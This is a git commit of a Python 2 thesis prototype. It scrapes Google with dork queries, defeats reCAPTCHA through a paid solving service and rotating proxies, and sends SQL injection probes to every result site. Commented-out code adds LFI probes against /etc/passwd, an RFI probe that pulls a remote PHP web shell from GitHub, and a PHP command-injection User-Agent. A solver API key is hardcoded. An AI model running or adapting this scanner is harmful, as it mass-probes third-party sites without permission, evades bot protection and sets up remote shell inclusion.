eed3e04bbd0ee15139a460f64808bcd7c2b52326
Dennys Augustus <dennysaug@gmail.com>
2018-09-30 11:30:27 -0300

    Projeto TCC

---
+++ google/search.py
@@ -0,0 +1,167 @@
+#!/usr/bin/env python
+# *-* coding: utf-8 *-*
+import re
+import time
+import urllib2
+import requests
+import pyping
+from BeautifulSoup import BeautifulSoup
+
+
+class GoogleEngine:
+
+    def __init__(self, key='777c64eaf7b22ead16668198b16266e1'):
+        self.request_headers = {
+            "Accept-Language": "en-US,en;q=0.5",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Referer": "https://www.google.com",
+            "Connection": "keep-alive"
+        }
+
+        self.url = "http://www.google.com/search"
+        self.hl = "en"
+        # self.q = "????"
+        self.start = 1  # numero da pagina
+        self.num = "100"  # qtd de resultados por paginas
+        # self.sa = "N"
+        # self.filter = "0"
+        self.key = key
+        self.request = 'http://2captcha.com/in.php'
+        self.response = 'http://2captcha.com/res.php'
+        self.proxies = {}
+
+        self.getProxy()
+
+    # resolve captcha
+    def solve(self, googlekey, site):
+
+
+        payload = {'key': self.key, 'method': 'userrecaptcha', 'googlekey': googlekey, 'pageurl': site}
+        req = requests.get(self.request, params=payload, proxies=self.proxies)
+        req = req.content.split('|')
+
+        if req[0] == 'OK':
+            idRequest = req[1]
+            payload = {'key': self.key, 'action': 'get', 'id': idRequest}
+            wait = True
+            i = 0
+            while wait:
+                try:
+                    time.sleep(15)
+                    res = requests.get(self.response, params=payload, proxies=self.proxies, timeout=1)
+                    res = res.content.split('|')
+                    if res[0] == 'OK':
+                        wait = False
+                        return res[1]
+                    else:
+                        if i > 4:
+                            return True
+                        i = i + 1
+                        time.sleep(15)
+                        print str(i) + 'ª Tentativa - Waiting Solve Captcha'
+
+                except (requests.exceptions.ConnectionError), e:
+                    print '- Timeout'
+                    time.sleep(2)
+
+
+        return False
+
+    def search(self, query):
+
+        results = []
+        total = 0
+
+        #dominios = ['com', 'com.br', 'pt', 'it', 'es'] #PODE ADICIONAR VARIOS DOMINIOS DO GOOGLE
+        dominios = ['com.br']
+
+        for q in query:
+            q = q.replace('\n', '').replace('\r', '')
+            for dominio in dominios:
+                print '\nSearch [' + q + '] in www.google.' + dominio
+                q = urllib2.quote(q)
+                url_search = "http://www.google." + dominio + "/search?hl=" + self.hl + "&q=" + q + "&start=" + str(
+                    self.start) + "&num=" + self.num + "&sa=N&filter=0"
+
+                response = requests.get(url_search, headers=self.request_headers, proxies=self.proxies)
+
+                while True:
+
+                    print "\n\t\t\tPagina: " + str(self.start) + "\n"
+
+                    # se tiver recaptcha, resolve
+
+                    if response.url.find("google.com/sorry") >= 0:
+                        print "Captcha para resolver"
+
+                        # explicacao: pq nao usei urllib2? R: problemas no redirecionamento e mais linhas de codigos
+
+                        soup = BeautifulSoup(response.text)
+                        googlekey = soup.find(attrs={"id": "recaptcha"})['data-sitekey']
+                        solveCaptcha = self.solve(googlekey, response.url)
+
+                        if type(solveCaptcha) == (str):
+
+                            try:
+                                response = requests.get(response.url + "&g-recaptcha-response=" + solveCaptcha,
+                                                    headers=self.request_headers)
+
+                            except (requests.exceptions.SSLError, requests.exceptions.ConnectionError), e:
+                                print '- SSL error'
+                                pass
+                        else:
+                            break
+
+
+
+                        print "Captcha resolvido com sucesso"
+
+                    # captura codigo html da pagina
+                    soup = BeautifulSoup(response.text)
+                    # print response.url
+
+                    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
+
+                    i = 1
+                    # captura os links dos resultados
+                    links = soup.findAll("h3", {"class": "r"})
+                    for link in links:
+                        link = link.findChild().attrs[0][1]
+                        fullurl = link
+                        m = re.search(p, link)
+                        link = m.group('host')
+                        print '# [google.' + dominio + '] Verificando  ' + str(i) + ' / ' + str(
+                            len(links)) + ' : ' + fullurl
+                        # if link not in results:
+                        if fullurl not in results:
+                            results.append(fullurl)
+                        i += 1
+                        total += i
+
+                    print "Hosts: " + str(i)
+
+                    self.start += 1
+
+                    # avanca para proxima pagina
+                    try:
+                        linknext = str(response.url[:22]) + soup.find(attrs={"id": "pnnext"})["href"]
+                        response = requests.get(linknext, headers=self.request_headers, proxies=self.proxies)
+                    except:
+                        break
+
+        return results
+
+    def getProxy(self):
+        #r = requests.get('https://proxy.l337.tech/txt')
+        listproxy = open('proxies.txt', 'r')
+        listproxy = listproxy.readlines()
+        proxies = {}
+        for proxy in listproxy:
+            proxy = proxy.replace('\n','').split(' ')[0]
+            proxy = proxy.split(':')
+            if(len(proxy) == 2):
+                proxy = {proxy[0] : proxy[1]}
+                proxies.update(proxy)
+
+        self.proxies = proxies
---
+++ pyownz.py
@@ -0,0 +1,88 @@
+"""
+PROJETO PROTIPO
+TCC EM CIENCIA DA COMPUTACAO
+AUTOR: DENNYS A P OLIVEIRA.
+2018.
+"""
+import requests
+import sys
+import re
+from google import search
+
+
+def main():
+
+    print "##### Scan Google ######"
+    #O PARAMETRO PASSADO NO GOOGLEENGINE É A KEY DO 2CAPTCHA.COM USADA PARA RESOLVER CAPTCHAS VIA WEBSERVICE.
+    buscar = search.GoogleEngine("777c64eaf7b22ead16668198b16266e1")
+    print "Selecione a opcao desejada:\n 1) Pesquisar por string\n 2) Informar arquivo contendo strings\n 3) Executar testes no arquivo com hosts"
+    opcao = raw_input("\nOpcao: ")
+    string_busca = []
+    if opcao == '1':
+        string_busca.append(raw_input("Google Dork: "))
+
+    elif opcao == '2':
+        dorkfile = raw_input('Arquivo contendo strings: ')
+        string_busca = open(dorkfile, 'rb').readlines()
+
+    else:
+        hostsfile = raw_input("Nome do arquivo com hosts: ")
+        urls = open(hostsfile, 'rb').readlines()
+
+    if opcao in ['1', '2']:
+        urls = buscar.search(string_busca)
+        #lfi_header = buscar.request_headers
+        #lfi_header['User-Agent'] = "<?system('id');?>"
+        print 'Total de resultados: ' + str(len(urls))
+        nome_arquivo = raw_input("Nome do arquivo que deseja salvar: ")
+
+        with open(nome_arquivo, "w") as f:
+            f.writelines("\n".join(urls))
+            f.close()
+    i = 1
+    vuln = []
+    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
+
+    for fullurl in urls:
+        fullurl = fullurl.replace('\n', '')
+        sys.stdout.write("\r" + str(i) + "/" + str(len(urls)))
+        sys.stdout.flush()
+        m = re.search(p, fullurl)
+        link = m.group('host')
+        if link not in vuln:
+            try:
+                vuln.append(link)
+                resp = requests.get(str(fullurl) + "=1\' or \'1\' = \'1\''", headers=buscar.request_headers, timeout=1)
+                body = resp.text
+                fullbody = body
+                if "You have an error in your SQL syntax" in fullbody:
+                    print ("\n" + fullurl + " --> SQL injection vulnerable!")
+
+                """
+                #SE QUISER ADICIONAR OUTROS TESTES DE VULNERABILIDADES.. SEGUE O MODELO ABAIXO.
+                resp = requests.get(fullurl.split('=')[0] + '=../../../../../../etc/passwd', headers=buscar.request_headers, timeout=1)
+                body = resp.text
+                fullbody = body
+                if "root:x:0:0:root:/root:/bin/bash" in fullbody:
+                    print ("\n" + fullurl + " --> LFI vulnerable!")
+
+                resp = requests.get(fullurl.split('=')[
+                                        0] + '=https://raw.githubusercontent.com/huntergregal/tools/master/shells/simple_shell.php?cmd=id',
+                                    headers=buscar.request_headers, timeout=1)
+                body = resp.text
+                fullbody = body
+                if "uid=(" in fullbody:
+                    print ("\n" + fullurl + " --> RFI vulnerable!")
+                    
+                """
+
+            except (requests.exceptions.ConnectionError, requests.exceptions.MissingSchema, requests.exceptions.ContentDecodingError, requests.exceptions.ReadTimeout, requests.exceptions.TooManyRedirects, TypeError):
+                pass
+
+        i += 1
+
+    print "\n\nFIM!"
+
+
+if __name__ == "__main__":
+    main()
